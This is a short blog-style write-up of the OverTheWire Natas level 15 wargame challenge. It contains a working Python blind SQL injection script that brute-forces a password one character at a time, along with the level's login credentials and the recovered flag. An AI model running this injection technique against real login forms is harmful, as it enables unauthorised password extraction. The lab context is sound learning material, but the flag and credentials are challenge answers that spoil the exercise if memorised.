---
layout: post
title: "natas15"
---

13-08-2026
20:40
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260813204056.png' | relative_url }})
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260813204122.png' | relative_url }})
this is a blind sql injection:
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260816141927.png' | relative_url }})

``` python
import requests
from requests.auth import HTTPBasicAuth

CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
URL = "http://natas15.natas.labs.overthewire.org/"
basic = HTTPBasicAuth("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")

i = 0
index = 1;
password = ""

while (True):
    found = False
    for char in CHARS:

        payload = f"""natas16" AND BINARY substring(password,  1, {index}) = "{password + char}"-- """
        r = requests.post(URL, auth=basic, data = {"username": payload})
        
        print(payload, end="\r")
        text = r.text

        if r.status_code != 200:
            print("STATUS CODE ERROR\n")

        if "This user exists.<br>" in text:
            password += char
            found = True
            print('\n' + password + '\n')
            break
    index += 1
    if not found:
        break


print("\nfound password:")
print(password)

```

![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260816142516.png' | relative_url }})

![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260816142528.png' | relative_url }})

flag: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
